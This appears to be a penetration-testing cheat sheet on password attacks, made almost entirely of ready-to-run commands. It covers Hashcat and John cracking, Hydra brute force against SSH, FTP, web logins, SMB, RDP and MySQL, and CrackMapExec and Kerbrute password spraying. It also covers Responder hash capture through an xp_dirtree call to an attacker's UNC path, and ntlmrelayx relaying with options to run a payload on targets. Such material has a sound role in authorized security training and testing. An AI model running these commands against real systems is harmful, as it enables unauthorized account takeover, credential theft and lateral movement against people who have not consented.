# 🔑 Phase 5 — Password Attacks

> **Credentials unlock everything.** Hash cracking, brute force, and credential relay techniques used constantly in real engagements.

---

## Table of Contents
- [Hash Identification](#hash-identification)
- [Hashcat — Hash Cracking](#hashcat--hash-cracking)
- [John the Ripper](#john-the-ripper)
- [Hydra — Online Brute Force](#hydra--online-brute-force)
- [CrackMapExec — Password Spraying](#crackmapexec--password-spraying)
- [Responder — Capture Hashes](#responder--capture-hashes)
- [NTLMrelayx — Relay Attacks](#ntlmrelayx--relay-attacks)
- [Kerbrute — Kerberos Spraying](#kerbrute--kerberos-spraying)
- [Common Password Lists](#common-password-lists)

---

## Hash Identification

Before cracking, identify the hash type:

- [ ] **hash-identifier**:
  ```bash
  hash-identifier <hash>
  ```
- [ ] **hashid**:
  ```bash
  hashid '<hash>'
  hashid -m '<hash>'   # -m shows Hashcat mode number
  ```
- [ ] **Common hash examples**:

| Hash Type | Example | Hashcat Mode |
|---|---|---|
| MD5 | `5d41402abc4b2a76b9719d911017c592` | `-m 0` |
| SHA1 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` | `-m 100` |
| SHA256 | `2c624232cdd221771294dfbb310acbc...` | `-m 1400` |
| NTLM | `b4b9b02e6f09a9bd760f388b67351e2b` | `-m 1000` |
| NTLMv2 | `<user>::<domain>:<challenge>:...` | `-m 5600` |
| NetNTLMv1 | `<user>::<domain>:<lm>:<nt>:<chall>` | `-m 5500` |
| bcrypt | `$2a$10$...` | `-m 3200` |
| SHA512crypt | `$6$...` | `-m 1800` |
| MD5crypt | `$1$...` | `-m 500` |
| WPA/WPA2 | (capture file) | `-m 22000` |
| Kerberos AS-REP | `$krb5asrep$23$...` | `-m 18200` |
| Kerberoast | `$krb5tgs$23$...` | `-m 13100` |

---

## Hashcat — Hash Cracking

### Basic Syntax

```bash
hashcat -m <mode> -a <attack_mode> <hash_file> <wordlist> [rules]
```

**Attack modes:** `0` = dictionary, `1` = combination, `3` = brute-force, `6` = hybrid

### Common Commands

- [ ] **Dictionary attack** (most common):
  ```bash
  hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- [ ] **Dictionary + rules** (extends wordlist coverage massively):
  ```bash
  hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
  hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
  ```
- [ ] **NTLM hash**:
  ```bash
  hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
  ```
- [ ] **NTLMv2 (Responder captures)**:
  ```bash
  hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- [ ] **Kerberos AS-REP hashes**:
  ```bash
  hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- [ ] **Kerberoast TGS hashes**:
  ```bash
  hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- [ ] **Brute force (short passwords)**:
  ```bash
  hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a?a?a    # 8 char any
  hashcat -m 0 hashes.txt -a 3 ?l?l?l?l?d?d?d?d     # 8 char lower+digit
  ```
- [ ] **Show cracked hashes**:
  ```bash
  hashcat -m <mode> hashes.txt --show
  ```
- [ ] **GPU acceleration** (if available):
  ```bash
  hashcat -m 0 hashes.txt wordlist.txt -d 1    # Use GPU 1
  ```

### Hashcat Masks (Brute Force)

| Mask | Charset |
|---|---|
| `?l` | lowercase a-z |
| `?u` | uppercase A-Z |
| `?d` | digits 0-9 |
| `?s` | special chars |
| `?a` | all printable |
| `?b` | all bytes |

---

## John the Ripper

Good for formats Hashcat doesn't support (SSH keys, Zip, PDF, etc.):

- [ ] **Basic crack**:
  ```bash
  john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
  john hashes.txt --format=<format>
  ```
- [ ] **Show cracked**:
  ```bash
  john --show hashes.txt
  ```
- [ ] **Common formats**:
  ```bash
  john --format=NT hashes.txt                    # NTLM
  john --format=sha512crypt hashes.txt            # /etc/shadow SHA512
  john --format=bcrypt hashes.txt                 # bcrypt
  ```
- [ ] **SSH private key cracking**:
  ```bash
  ssh2john id_rsa > id_rsa.hash
  john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
  ```
- [ ] **ZIP password**:
  ```bash
  zip2john file.zip > zip.hash
  john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
  ```
- [ ] **PDF password**:
  ```bash
  pdf2john file.pdf > pdf.hash
  john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
  ```
- [ ] **KeePass database**:
  ```bash
  keepass2john database.kdbx > keepass.hash
  john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
  ```

---

## Hydra — Online Brute Force

> **⚠️ Warning:** Online brute force is loud and may lock accounts. Check for lockout policies first.

- [ ] **SSH**:
  ```bash
  hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$IP
  hydra -L users.txt -P passwords.txt ssh://$IP -t 4
  ```
- [ ] **FTP**:
  ```bash
  hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://$IP
  ```
- [ ] **HTTP POST login form**:
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid password"
  # Last part is the failure string (what the page shows on bad login)
  ```
- [ ] **HTTP GET login**:
  ```bash
  hydra -l admin -P passwords.txt $IP http-get /admin/
  ```
- [ ] **SMB**:
  ```bash
  hydra -l <user> -P passwords.txt smb://$IP
  ```
- [ ] **RDP**:
  ```bash
  hydra -l <user> -P passwords.txt rdp://$IP
  ```
- [ ] **MySQL**:
  ```bash
  hydra -l root -P passwords.txt mysql://$IP
  ```
- [ ] **WinRM**:
  ```bash
  crackmapexec winrm $IP -u <user> -p passwords.txt
  ```

---

## CrackMapExec — Password Spraying

> **Password spraying** = try one password against many users (avoids lockout)

- [ ] **SMB spray**:
  ```bash
  crackmapexec smb $IP -u users.txt -p 'Password123' --continue-on-success
  crackmapexec smb $IP -u users.txt -p passwords.txt --no-bruteforce  # 1:1 mapping
  ```
- [ ] **WinRM spray**:
  ```bash
  crackmapexec winrm $IP -u users.txt -p 'Password123'
  ```
- [ ] **LDAP spray**:
  ```bash
  crackmapexec ldap $IP -u users.txt -p 'Password123'
  ```
- [ ] **Check if credentials work (domain-wide)**:
  ```bash
  crackmapexec smb $IP -u <user> -p <pass> -d <domain>
  # Pwn3d! = local admin  |  (Pwn3d!) = domain admin
  ```

---

## Responder — Capture Hashes

Responder intercepts LLMNR/NBT-NS/mDNS requests and captures NTLMv2 hashes when a Windows host tries to resolve a name.

- [ ] **Start Responder** (on attacker machine on the same network):
  ```bash
  sudo responder -I tun0 -wrdv
  # -w: WPAD, -r: rogue, -d: DHCP, -v: verbose
  ```
- [ ] **Trigger hash capture**:
  - Visit a UNC path in browser from target: `\\<attacker_ip>\share`
  - Use MSSQL xp_dirtree: `EXEC xp_dirtree '\\<attacker_ip>\share'`
  - Any failed SMB connection attempt
- [ ] **Crack captured NTLMv2 hashes**:
  ```bash
  cat /usr/share/responder/logs/*.txt  # Check Responder logs for hashes
  hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
  ```

---

## NTLMrelayx — Relay Attacks

If SMB signing is disabled, relay captured hashes instead of cracking them:

- [ ] **Check for SMB signing off**:
  ```bash
  crackmapexec smb $IP --gen-relay-list targets.txt
  # targets.txt will contain IPs with SMB signing disabled
  ```
- [ ] **Setup relay attack**:
  ```bash
  # Terminal 1: Disable SMB/HTTP in Responder (to forward to ntlmrelayx)
  sudo responder -I tun0 --lm
  # Edit /etc/responder/Responder.conf → SMB = Off, HTTP = Off
  sudo responder -I tun0 -wv
  
  # Terminal 2: Run ntlmrelayx
  python3 ntlmrelayx.py -tf targets.txt -smb2support
  
  # Options:
  -smb2support         # SMBv2 support
  -i                   # interactive SMB shell
  -c "whoami"          # execute command
  -e shell.exe         # execute payload
  ```

---

## Kerbrute — Kerberos Spraying

- [ ] **Enumerate valid usernames** (no creds needed):
  ```bash
  ./kerbrute userenum -d <domain> --dc $IP usernames.txt
  ```
- [ ] **Password spray** (slow and low-noise):
  ```bash
  ./kerbrute passwordspray -d <domain> --dc $IP valid_users.txt 'Password123'
  ```

> **⚠️ Note:** Kerberos lockout policy is separate from normal lockout. Check `Get-DomainPolicy` if you have PowerView access.

---

## Common Password Lists

| List | Path | Use Case |
|---|---|---|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | General password cracking |
| fasttrack.txt | `/usr/share/wordlists/fasttrack.txt` | Quick spray of common passwords |
| common-corporate | `/usr/share/seclists/Passwords/Common-Credentials/` | Corporate password spraying |
| 500 worst | `/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt` | Default/weak creds |
| Default creds | `/usr/share/seclists/Passwords/Default-Credentials/` | Service default passwords |

### Custom Wordlist Generation

```bash
# CeWL — wordlist from website content
cewl http://$IP -m 4 -w cewl_wordlist.txt

# Username generation from name list
john --wordlist=names.txt --rules=NT --stdout > usernames.txt

# Combine username + corporate suffix
for user in $(cat users.txt); do
  echo "${user}@company.com"
  echo "${user}123"
  echo "${user}2024"
  echo "Welcome${user}"
done > custom_passwords.txt
```

---

## 🔗 References

- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [John the Ripper Formats](https://openwall.info/wiki/john/sample-hashes)
- [Responder GitHub](https://github.com/lgandx/Responder)
- [ntlmrelayx Guide — byt3bl33d3r](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

---

*[← Shell Techniques](../04_exploitation/03_shell_techniques.md) · [Back to Main](../README.md) · [Post-Exploitation →](../06_post_exploitation/README.md)*
